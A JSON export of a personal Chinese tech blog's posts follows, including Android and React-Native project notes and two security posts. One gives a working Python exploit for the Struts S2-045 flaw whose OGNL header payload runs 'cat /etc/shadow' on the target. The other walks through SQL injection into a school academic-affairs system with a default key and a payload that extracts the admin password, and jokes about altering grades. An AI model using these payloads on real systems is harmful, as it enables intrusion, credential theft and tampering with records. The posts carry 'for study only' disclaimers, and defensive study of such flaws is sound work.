title=\"漏洞原因\"></a>漏洞原因</h4><blockquote>\n<p>在AndroidManifest.xml中activity有一个属性android:exported，当这个属性为true的时候，表示该组件可以被其他组件调用。所以直接不写这个属性就可以了，默认false。<br>ps:其实这个app本来是没这个属性，我为了方便演示才加上的。</p>\n</blockquote>"},{"layout":"post","title":"微信小程序app源码","date":"2017-02-06T02:16:04.000Z","comments":1,"_content":"\n#### 前言\n\n>小程序已经出来一段时间了，对于小程序就不做多评价了，网上很多介绍文章。\n>我们公司的这个小程序项目是一个演示项目，介绍公司产品的主要功能，代码很简单。\n>微信小程序本身就很简单，和react-native很多相似处。\n>为防止数据泄漏，我就把接口换成了死数据。\n>使用到了下拉刷新，上拉加载更多，wx-charts框架等\n\n##### 登录<!--more-->\n\n> ![](/images/Screenshot_20170214-13584228.jpg)\n\n##### 主页\n\n> ![](/images/Screenshot_20170214-135849.jpg)\n\n##### 图表\n\n> ![](/images/Screenshot_20170214-135803.jpg)\n\n##### 菜单\n\n> ![](/images/Screenshot_20170214-135829.jpg)\n\n##### 列表\n\n> ![](/images/Screenshot_20170214-135841.jpg)\n\n##### 详情\n\n> ![](/images/Screenshot_20170214-135848.jpg)\n\n\n\n##### 源码\n * https://github.com/Y00z/wx_acm","source":"_posts/diary-2017-0206-01.md","raw":"---\nlayout: post\ntitle: 微信小程序app源码\ndate: 2017-02-06 10:16:04\ncomments: true\ntags:\n\t- 开源\n\t- 小程序\n---\n\n#### 前言\n\n>小程序已经出来一段时间了，对于小程序就不做多评价了，网上很多介绍文章。\n>我们公司的这个小程序项目是一个演示项目，介绍公司产品的主要功能，代码很简单。\n>微信小程序本身就很简单，和react-native很多相似处。\n>为防止数据泄漏，我就把接口换成了死数据。\n>使用到了下拉刷新，上拉加载更多，wx-charts框架等\n\n##### 登录<!--more-->\n\n> ![](/images/Screenshot_20170214-13584228.jpg)\n\n##### 主页\n\n> ![](/images/Screenshot_20170214-135849.jpg)\n\n##### 图表\n\n> ![](/images/Screenshot_20170214-135803.jpg)\n\n##### 菜单\n\n> ![](/images/Screenshot_20170214-135829.jpg)\n\n##### 列表\n\n> ![](/images/Screenshot_20170214-135841.jpg)\n\n##### 详情\n\n> ![](/images/Screenshot_20170214-135848.jpg)\n\n\n\n##### 源码\n * https://github.com/Y00z/wx_acm","slug":"diary-2017-0206-01","published":1,"updated":"2017-02-22T08:09:44.057Z","photos":[],"link":"","_id":"cjvhjxaak0008iny278y1xvkf","content":"<h4 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h4><blockquote>\n<p>小程序已经出来一段时间了，对于小程序就不做多评价了，网上很多介绍文章。<br>我们公司的这个小程序项目是一个演示项目，介绍公司产品的主要功能，代码很简单。<br>微信小程序本身就很简单，和react-native很多相似处。<br>为防止数据泄漏，我就把接口换成了死数据。<br>使用到了下拉刷新，上拉加载更多，wx-charts框架等</p>\n</blockquote>\n<h5 id=\"登录\"><a href=\"#登录\" class=\"headerlink\" title=\"登录\"></a>登录<a id=\"more\"></a></h5><blockquote>\n<p><img src=\"/images/Screenshot_20170214-13584228.jpg\" alt></p>\n</blockquote>\n<h5 id=\"主页\"><a href=\"#主页\" class=\"headerlink\" title=\"主页\"></a>主页</h5><blockquote>\n<p><img src=\"/images/Screenshot_20170214-135849.jpg\" alt></p>\n</blockquote>\n<h5 id=\"图表\"><a href=\"#图表\" class=\"headerlink\" title=\"图表\"></a>图表</h5><blockquote>\n<p><img src=\"/images/Screenshot_20170214-135803.jpg\" alt></p>\n</blockquote>\n<h5 id=\"菜单\"><a href=\"#菜单\" class=\"headerlink\" title=\"菜单\"></a>菜单</h5><blockquote>\n<p><img src=\"/images/Screenshot_20170214-135829.jpg\" alt></p>\n</blockquote>\n<h5 id=\"列表\"><a href=\"#列表\" class=\"headerlink\" title=\"列表\"></a>列表</h5><blockquote>\n<p><img src=\"/images/Screenshot_20170214-135841.jpg\" alt></p>\n</blockquote>\n<h5 id=\"详情\"><a href=\"#详情\" class=\"headerlink\" title=\"详情\"></a>详情</h5><blockquote>\n<p><img src=\"/images/Screenshot_20170214-135848.jpg\" alt></p>\n</blockquote>\n<h5 id=\"源码\"><a href=\"#源码\" class=\"headerlink\" title=\"源码\"></a>源码</h5><ul>\n<li><a href=\"https://github.com/Y00z/wx_acm\" target=\"_blank\" rel=\"noopener\">https://github.com/Y00z/wx_acm</a></li>\n</ul>\n","site":{"data":{}},"excerpt":"<h4 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h4><blockquote>\n<p>小程序已经出来一段时间了，对于小程序就不做多评价了，网上很多介绍文章。<br>我们公司的这个小程序项目是一个演示项目，介绍公司产品的主要功能，代码很简单。<br>微信小程序本身就很简单，和react-native很多相似处。<br>为防止数据泄漏，我就把接口换成了死数据。<br>使用到了下拉刷新，上拉加载更多，wx-charts框架等</p>\n</blockquote>\n<h5 id=\"登录\"><a href=\"#登录\" class=\"headerlink\" title=\"登录\"></a>登录","more":"</h5><blockquote>\n<p><img src=\"/images/Screenshot_20170214-13584228.jpg\" alt></p>\n</blockquote>\n<h5 id=\"主页\"><a href=\"#主页\" class=\"headerlink\" title=\"主页\"></a>主页</h5><blockquote>\n<p><img src=\"/images/Screenshot_20170214-135849.jpg\" alt></p>\n</blockquote>\n<h5 id=\"图表\"><a href=\"#图表\" class=\"headerlink\" title=\"图表\"></a>图表</h5><blockquote>\n<p><img src=\"/images/Screenshot_20170214-135803.jpg\" alt></p>\n</blockquote>\n<h5 id=\"菜单\"><a href=\"#菜单\" class=\"headerlink\" title=\"菜单\"></a>菜单</h5><blockquote>\n<p><img src=\"/images/Screenshot_20170214-135829.jpg\" alt></p>\n</blockquote>\n<h5 id=\"列表\"><a href=\"#列表\" class=\"headerlink\" title=\"列表\"></a>列表</h5><blockquote>\n<p><img src=\"/images/Screenshot_20170214-135841.jpg\" alt></p>\n</blockquote>\n<h5 id=\"详情\"><a href=\"#详情\" class=\"headerlink\" title=\"详情\"></a>详情</h5><blockquote>\n<p><img src=\"/images/Screenshot_20170214-135848.jpg\" alt></p>\n</blockquote>\n<h5 id=\"源码\"><a href=\"#源码\" class=\"headerlink\" title=\"源码\"></a>源码</h5><ul>\n<li><a href=\"https://github.com/Y00z/wx_acm\" target=\"_blank\" rel=\"noopener\">https://github.com/Y00z/wx_acm</a></li>\n</ul>"},{"layout":"post","title":"React-Native电商项目源码","date":"2017-02-23T05:57:29.000Z","comments":1,"_content":"\n\n#### 前言\n>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于react-native就不多介绍了，这个项目去年的时候就开始写了，中间因为公司的一些项目原因耽搁了一段时间，所以一直到现在才发出来.\n>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个项目比较简单，主要是布局方面，代码简洁明了，适合初识react-native的同学了解和学习\n>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于没有ios设备，所以没有对ios设备做适配，另外感谢小马哥提供的学习资料素材。\n>>&nbsp;&nbsp;项目用的es6\n\n#### 接口\n* 接口方面全部用的本地json文件。<!--more-->\n\n\n#### 库\n* react-native-tab-navigator\n\n#### 运行\n* npm install\n* react-native run-android\n\n#### 演示\n> ![](/images/1488790170.gif)\n\n#### 项目地址\n* [https://github.com/Y00z/react-navie_store](https://github.com/Y00z/react-navie_store)\n\n","source":"_posts/diary-2017-0223-01.md","raw":"---\nlayout: post\ntitle: React-Native电商项目源码\ndate: 2017-02-23 13:57:29\ncomments: true\ntags:\n\t- React-Native\n\t- 开源\n---\n\n\n#### 前言\n>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于react-native就不多介绍了，这个项目去年的时候就开始写了，中间因为公司的一些项目原因耽搁了一段时间，所以一直到现在才发出来.\n>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个项目比较简单，主要是布局方面，代码简洁明了，适合初识react-native的同学了解和学习\n>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于没有ios设备，所以没有对ios设备做适配，另外感谢小马哥提供的学习资料素材。\n>>&nbsp;&nbsp;项目用的es6\n\n#### 接口\n* 接口方面全部用的本地json文件。<!--more-->\n\n\n#### 库\n* react-native-tab-navigator\n\n#### 运行\n* npm install\n* react-native run-android\n\n#### 演示\n> ![](/images/1488790170.gif)\n\n#### 项目地址\n* [https://github.com/Y00z/react-navie_store](https://github.com/Y00z/react-navie_store)\n\n","slug":"diary-2017-0223-01","published":1,"updated":"2017-05-31T10:45:39.144Z","photos":[],"link":"","_id":"cjvhjxaal0009iny2cfppurwm","content":"<h4 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h4><blockquote>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于react-native就不多介绍了，这个项目去年的时候就开始写了，中间因为公司的一些项目原因耽搁了一段时间，所以一直到现在才发出来.<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个项目比较简单，主要是布局方面，代码简洁明了，适合初识react-native的同学了解和学习<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于没有ios设备，所以没有对ios设备做适配，另外感谢小马哥提供的学习资料素材。</p>\n<blockquote>\n<p>&nbsp;&nbsp;项目用的es6</p>\n</blockquote>\n</blockquote>\n<h4 id=\"接口\"><a href=\"#接口\" class=\"headerlink\" title=\"接口\"></a>接口</h4><ul>\n<li>接口方面全部用的本地json文件。<a id=\"more\"></a></li>\n</ul>\n<h4 id=\"库\"><a href=\"#库\" class=\"headerlink\" title=\"库\"></a>库</h4><ul>\n<li>react-native-tab-navigator</li>\n</ul>\n<h4 id=\"运行\"><a href=\"#运行\" class=\"headerlink\" title=\"运行\"></a>运行</h4><ul>\n<li>npm install</li>\n<li>react-native run-android</li>\n</ul>\n<h4 id=\"演示\"><a href=\"#演示\" class=\"headerlink\" title=\"演示\"></a>演示</h4><blockquote>\n<p><img src=\"/images/1488790170.gif\" alt></p>\n</blockquote>\n<h4 id=\"项目地址\"><a href=\"#项目地址\" class=\"headerlink\" title=\"项目地址\"></a>项目地址</h4><ul>\n<li><a href=\"https://github.com/Y00z/react-navie_store\" target=\"_blank\" rel=\"noopener\">https://github.com/Y00z/react-navie_store</a></li>\n</ul>\n","site":{"data":{}},"excerpt":"<h4 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h4><blockquote>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于react-native就不多介绍了，这个项目去年的时候就开始写了，中间因为公司的一些项目原因耽搁了一段时间，所以一直到现在才发出来.<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个项目比较简单，主要是布局方面，代码简洁明了，适合初识react-native的同学了解和学习<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于没有ios设备，所以没有对ios设备做适配，另外感谢小马哥提供的学习资料素材。</p>\n<blockquote>\n<p>&nbsp;&nbsp;项目用的es6</p>\n</blockquote>\n</blockquote>\n<h4 id=\"接口\"><a href=\"#接口\" class=\"headerlink\" title=\"接口\"></a>接口</h4><ul>\n<li>接口方面全部用的本地json文件。","more":"</li>\n</ul>\n<h4 id=\"库\"><a href=\"#库\" class=\"headerlink\" title=\"库\"></a>库</h4><ul>\n<li>react-native-tab-navigator</li>\n</ul>\n<h4 id=\"运行\"><a href=\"#运行\" class=\"headerlink\" title=\"运行\"></a>运行</h4><ul>\n<li>npm install</li>\n<li>react-native run-android</li>\n</ul>\n<h4 id=\"演示\"><a href=\"#演示\" class=\"headerlink\" title=\"演示\"></a>演示</h4><blockquote>\n<p><img src=\"/images/1488790170.gif\" alt></p>\n</blockquote>\n<h4 id=\"项目地址\"><a href=\"#项目地址\" class=\"headerlink\" title=\"项目地址\"></a>项目地址</h4><ul>\n<li><a href=\"https://github.com/Y00z/react-navie_store\" target=\"_blank\" rel=\"noopener\">https://github.com/Y00z/react-navie_store</a></li>\n</ul>"},{"layout":"post","title":"s2-045任意命令执行exp","date":"2017-03-07T08:19:32.000Z","comments":1,"_content":"\n### 前言\n><font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！**</font>\n\n### 正文\n> * 今天早上一醒就被s2漏洞给刷屏了,心想一下这不是几年前的漏洞吗，怎么又火起来了\n> * 详细了解之后才知道今天凌晨的时候又爆了一个任意命令执行漏洞，由安恒WEBIN实验室发现.\n\n\n> * 涉及Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10多个版本。\n\n\n>* 可将版本更新至Struts 2.3.32 或者 Struts 2.5.10.1 或 使用第三方的防护设备进行防护。\n\n>目前官方已确认(漏洞编号S2-045)\n\n#### poc\n<!--more-->\n```python\n#! /usr/bin/env python\n# encoding:utf-8\nimport urllib2\nimport sys\nfrom poster.encode import multipart_encode\nfrom poster.streaminghttp import register_openers\n \ndef poc():\n    register_openers()\n    datagen, header = multipart_encode({\"image1\": open(\"tmp.txt\", \"rb\")})\n    header[\"User-Agent\"]=\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\"\n    header[\"Content-Type\"]=\"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='cat /etc/shadow').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\"\n    request = urllib2.Request(str(sys.argv[1]),datagen,headers=header)\n    response = urllib2.urlopen(request)\n    print response.read()\n \npoc()\n```\n\n![](/images/pasted-43.jpg)\n\n\n![](/images/pasted-44.jpg)\n\n\n\n#### 末尾\n希望这次各个厂商能及时防范，不要想前几年一样造成大量的数据泄漏(某东12G)","source":"_posts/diary-2017-0307-01.md","raw":"---\nlayout: post\ntitle: s2-045任意命令执行exp\ndate: 2017-03-07 16:19:32\ncomments: true\ntags:\n\t- 安全攻防\n---\n\n### 前言\n><font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！**</font>\n\n### 正文\n> * 今天早上一醒就被s2漏洞给刷屏了,心想一下这不是几年前的漏洞吗，怎么又火起来了\n> * 详细了解之后才知道今天凌晨的时候又爆了一个任意命令执行漏洞，由安恒WEBIN实验室发现.\n\n\n> * 涉及Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10多个版本。\n\n\n>* 可将版本更新至Struts 2.3.32 或者 Struts 2.5.10.1 或 使用第三方的防护设备进行防护。\n\n>目前官方已确认(漏洞编号S2-045)\n\n#### poc\n<!--more-->\n```python\n#! /usr/bin/env python\n# encoding:utf-8\nimport urllib2\nimport sys\nfrom poster.encode import multipart_encode\nfrom poster.streaminghttp import register_openers\n \ndef poc():\n    register_openers()\n    datagen, header = multipart_encode({\"image1\": open(\"tmp.txt\", \"rb\")})\n    header[\"User-Agent\"]=\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\"\n    header[\"Content-Type\"]=\"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='cat /etc/shadow').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\"\n    request = urllib2.Request(str(sys.argv[1]),datagen,headers=header)\n    response = urllib2.urlopen(request)\n    print response.read()\n \npoc()\n```\n\n![](/images/pasted-43.jpg)\n\n\n![](/images/pasted-44.jpg)\n\n\n\n#### 末尾\n希望这次各个厂商能及时防范，不要想前几年一样造成大量的数据泄漏(某东12G)","slug":"diary-2017-0307-01","published":1,"updated":"2017-03-19T08:23:04.111Z","photos":[],"link":"","_id":"cjvhjxaan000ainy2sbi23f0g","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><blockquote>\n<font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！</strong></font>\n</blockquote>\n<h3 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h3><blockquote>\n<ul>\n<li>今天早上一醒就被s2漏洞给刷屏了,心想一下这不是几年前的漏洞吗，怎么又火起来了</li>\n<li>详细了解之后才知道今天凌晨的时候又爆了一个任意命令执行漏洞，由安恒WEBIN实验室发现.</li>\n</ul>\n</blockquote>\n<blockquote>\n<ul>\n<li>涉及Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10多个版本。</li>\n</ul>\n</blockquote>\n<blockquote>\n<ul>\n<li>可将版本更新至Struts 2.3.32 或者 Struts 2.5.10.1 或 使用第三方的防护设备进行防护。</li>\n</ul>\n</blockquote>\n<blockquote>\n<p>目前官方已确认(漏洞编号S2-045)</p>\n</blockquote>\n<h4 id=\"poc\"><a href=\"#poc\" class=\"headerlink\" title=\"poc\"></a>poc</h4><a id=\"more\"></a>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#! /usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># encoding:utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib2</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">from</span> poster.encode <span class=\"keyword\">import</span> multipart_encode</span><br><span class=\"line\"><span class=\"keyword\">from</span> poster.streaminghttp <span class=\"keyword\">import</span> register_openers</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">poc</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    register_openers()</span><br><span class=\"line\">    datagen, header = multipart_encode(&#123;<span class=\"string\">\"image1\"</span>: open(<span class=\"string\">\"tmp.txt\"</span>, <span class=\"string\">\"rb\"</span>)&#125;)</span><br><span class=\"line\">    header[<span class=\"string\">\"User-Agent\"</span>]=<span class=\"string\">\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\"</span></span><br><span class=\"line\">    header[<span class=\"string\">\"Content-Type\"</span>]=<span class=\"string\">\"%&#123;(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='cat /etc/shadow').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;\"</span></span><br><span class=\"line\">    request = urllib2.Request(str(sys.argv[<span class=\"number\">1</span>]),datagen,headers=header)</span><br><span class=\"line\">    response = urllib2.urlopen(request)</span><br><span class=\"line\">    <span class=\"keyword\">print</span> response.read()</span><br><span class=\"line\"> </span><br><span class=\"line\">poc()</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/pasted-43.jpg\" alt></p>\n<p><img src=\"/images/pasted-44.jpg\" alt></p>\n<h4 id=\"末尾\"><a href=\"#末尾\" class=\"headerlink\" title=\"末尾\"></a>末尾</h4><p>希望这次各个厂商能及时防范，不要想前几年一样造成大量的数据泄漏(某东12G)</p>\n","site":{"data":{}},"excerpt":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><blockquote>\n<font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！</strong></font>\n</blockquote>\n<h3 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h3><blockquote>\n<ul>\n<li>今天早上一醒就被s2漏洞给刷屏了,心想一下这不是几年前的漏洞吗，怎么又火起来了</li>\n<li>详细了解之后才知道今天凌晨的时候又爆了一个任意命令执行漏洞，由安恒WEBIN实验室发现.</li>\n</ul>\n</blockquote>\n<blockquote>\n<ul>\n<li>涉及Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10多个版本。</li>\n</ul>\n</blockquote>\n<blockquote>\n<ul>\n<li>可将版本更新至Struts 2.3.32 或者 Struts 2.5.10.1 或 使用第三方的防护设备进行防护。</li>\n</ul>\n</blockquote>\n<blockquote>\n<p>目前官方已确认(漏洞编号S2-045)</p>\n</blockquote>\n<h4 id=\"poc\"><a href=\"#poc\" class=\"headerlink\" title=\"poc\"></a>poc</h4>","more":"<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#! /usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># encoding:utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib2</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">from</span> poster.encode <span class=\"keyword\">import</span> multipart_encode</span><br><span class=\"line\"><span class=\"keyword\">from</span> poster.streaminghttp <span class=\"keyword\">import</span> register_openers</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">poc</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    register_openers()</span><br><span class=\"line\">    datagen, header = multipart_encode(&#123;<span class=\"string\">\"image1\"</span>: open(<span class=\"string\">\"tmp.txt\"</span>, <span class=\"string\">\"rb\"</span>)&#125;)</span><br><span class=\"line\">    header[<span class=\"string\">\"User-Agent\"</span>]=<span class=\"string\">\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\"</span></span><br><span class=\"line\">    header[<span class=\"string\">\"Content-Type\"</span>]=<span class=\"string\">\"%&#123;(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='cat /etc/shadow').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;\"</span></span><br><span class=\"line\">    request = urllib2.Request(str(sys.argv[<span class=\"number\">1</span>]),datagen,headers=header)</span><br><span class=\"line\">    response = urllib2.urlopen(request)</span><br><span class=\"line\">    <span class=\"keyword\">print</span> response.read()</span><br><span class=\"line\"> </span><br><span class=\"line\">poc()</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/pasted-43.jpg\" alt></p>\n<p><img src=\"/images/pasted-44.jpg\" alt></p>\n<h4 id=\"末尾\"><a href=\"#末尾\" class=\"headerlink\" title=\"末尾\"></a>末尾</h4><p>希望这次各个厂商能及时防范，不要想前几年一样造成大量的数据泄漏(某东12G)</p>"},{"layout":"post","title":"某教务系统注入getshell提权一条龙(上)","date":"2017-03-14T03:14:26.000Z","comments":1,"_content":"### 前言\n><font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！**</font>\n\n### 正文\n> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这篇文章是我在去年的时候在土司和90上写的一篇文章，当时也将漏洞详细上报给乌云了。今时不同往日，如今乌云关了，<!--more-->土司也太久没登成了僵尸号。于是把文章搬过来，凑下文章篇数。\n\n### 漏洞详情\n >今天的目标\n\n![](/images/pasted-45.png)\n\n >找到webservice接口，路径在service.asmx\n\n![](/images/pasted-46.png)\n\n>漏洞在于\n> * GetStuCheckinInfo\n>这个接口\n\n![](/images/pasted-47.png)\n\n> 我们只需要关注`xh`和 `strKey` 这两个节点就可以了。\n\n> 其中的strKey都是默认的`KKKGZ2312`\n\n> `Xh`这个节点就是我们的注入语句了。\n\npoc:\n```sql\n222222' union select \nNull,kl,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null\n,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null from yhb where yhm='jwc01\n```\n\n>yhb   用户表\n>yhm   用户名\n>kl    口令\n\n>表示查询的是yhm表中jwc01的kl记录。(该教务系统默认管理员是jwc01)\n\n>构造好语句开始注入\n\n![](/images/pasted-48.png)\n\n>可以看到jwc01用户的密码密文出来了。\n\n>我们拿去解密\n\n![](/images/pasted-49.png)\n\n>Ok可以登录了\n\n![](/images/pasted-50.png)\n\n>Bingo\n\n![](/images/pasted-51.png)\n\n>靓女多多，\n\n![](/images/pasted-52.png)\n\n\n### 总结\n> 不想让文章太长，getshell提权部分就放在下篇。\n> 后期还会写更多的渗透文章，漫游内网，更改led大屏幕，免费上网，好(gai)好(cheng)学(ji)习，社工辅导员qq微博等等。\n>再次提醒：\n> **文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！**","source":"_posts/diary-2017-0314-01.md","raw":"---\nlayout: post\ntitle: 某教务系统注入getshell提权一条龙(上)\ndate: 2017-03-14 11:14:26\ncomments: true\ntags:\n\t- 安全攻防\n---\n### 前言\n><font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！**</font>\n\n### 正文\n> 